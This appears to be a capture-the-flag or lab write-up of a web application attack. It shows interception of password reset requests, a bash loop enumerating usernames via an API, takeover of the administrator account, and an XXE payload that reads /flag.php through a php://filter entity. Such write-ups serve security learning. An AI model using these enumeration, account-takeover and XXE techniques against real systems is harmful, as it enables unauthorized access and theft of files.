After logging in I'm presented with this page:
![[Pasted image 20240516173837.png]]

## Exploiting the Password Resetting Functionality

The password reset page:
![[Pasted image 20240516174058.png]]

Intercepting the request with burp:
![[Pasted image 20240516174157.png]]

When sending the request with different uids, I get different tokens:

| uid | token                                |
| --- | ------------------------------------ |
| 74  | e51a8a14-17ac-11ec-8e67-a3c050fe0c26 |
| 75  | e51a8a3c-17ac-11ec-8e68-7fe51c0c175e |
| 1   | e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c |
| 2   | e51a7dc6-17ac-11ec-8e1f-df8a04f4691d |
| 3   | e51a7df8-17ac-11ec-8e20-37f52352c5ab |
|     |                                      |

When I forward the API request, there is another 1 to change the password:
![[Pasted image 20240516181103.png]]

Turns out I can change the password of a user with specific uid, using the token I got from the API and a get request:
![[Pasted image 20240516181231.png]]

## Enumerating Users

By changing the UID of the API call in requests I can get the usernames:
![[Pasted image 20240516181508.png]]

Wrote the following script to get details of all users:
```bash
#!/bin/bash

for i in {1..100}; do
        details=$(curl -is -X GET http://83.136.251.226:43671/api.php/user/$i)
        printf "$details\n\n" | grep username
        printf "\n"
done
```

Success:
![[Pasted image 20240516183506.png]]

Now I can login as any user with the list of usernames, and changing their password.

Found the administrator user:
![[Pasted image 20240516210406.png]]

Now I can reset the password of the user as shown before.

## XXE

The admin have an additional page to add events:
![[Pasted image 20240516210531.png]]

It uses XML data:
![[Pasted image 20240516210617.png]]

Got the flag using a simple XXE payload:
![[Pasted image 20240516211011.png]]

The payload:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
```